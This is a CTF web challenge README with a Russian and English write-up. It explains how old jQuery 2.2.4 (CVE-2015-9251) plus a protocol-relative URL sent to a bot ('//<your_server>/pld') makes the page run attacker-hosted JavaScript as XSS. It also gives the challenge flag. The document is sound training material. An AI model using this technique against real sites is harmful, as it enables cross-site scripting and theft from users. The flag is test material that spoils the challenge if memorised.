# web | konstruktor

## Information

Мы сделали прикольный-конструктор объявлений для нашего бара.

We created a fancy constructor for our bar board.

## Deploy

```sh
cd deploy
docker compose -p konstrukt up --build -d
```

## Public

Provide archive: [public/konstruktor.tar.gz](public/konstruktor.tar.gz).

## TLDR

CVE-2015-9251

## Writeup (ru)

Задача представляет собой простое приложение, которое позволяет сохранить json с markdown'ом и позже получить его обратно.

При этом логика приложение написана на клиентской части, на любой обработчик кроме .php и .json мы возвращаем index.html.

Данная страница на /path запросит файл /path.json с сервера через `window.location.pathname`.

Важно обратить внимание что версия jquery(jquery-2.2.4) очень старая. И на нее есть несколько публичных CVE.

Нам интересен CVE-2015-9251, который исполняет ответ функции .ajax() на нашем origin, если ответ будет `text/javascript`.

У нас нет возможности загрузить javascript файл на сервер, но мы можем загрузить его на свой сервер. 

Единственная проблема — как заставить сервер получить наш файл ? Здесь поможет [Protocol-relative URLs](https://en.wikipedia.org/wiki/URL#prurl). 

Решение: 
1. Поднять свой сервер, который отдает XSS payload с нужными заголовками.
2. Отправить в бота `//<your_server>/pld`




## Writeup (en)
Task is a simple application that allows you to save json with markdown's and get it back later.

Application logic is implemented on the client side. Any handler other than .php and .json returns index.html file. This file on /path will request the /path.json file from the server via `window.location.pathname`.

It is important to note that the version of jquery(jquery-2.2.4) is very old. And there are several public CVEs for it.

We are interested in CVE-2015-9251, which executes the .ajax() function response on our origin if the response is `text/javascript`.

We don't have the ability to upload the javascript file to the server, but we can upload it to our server. 

The only problem is how to make the server get our file ? This is where [Protocol-relative URLs](https://en.wikipedia.org/wiki/URL#prurl) will help. 

Solution: 
1. Host your server that gives XSS payload with the right headers.
2. Send `//<your_server>/pld` to the bot.

[Payload](solve/run.sh)


## Cloudflare 

Yes (need to test)

## Flag
ctfcup{caff8735209fa9daca7437c06e39a6c7a196c21c8d9ede1fa4aa08b1c71f139a}
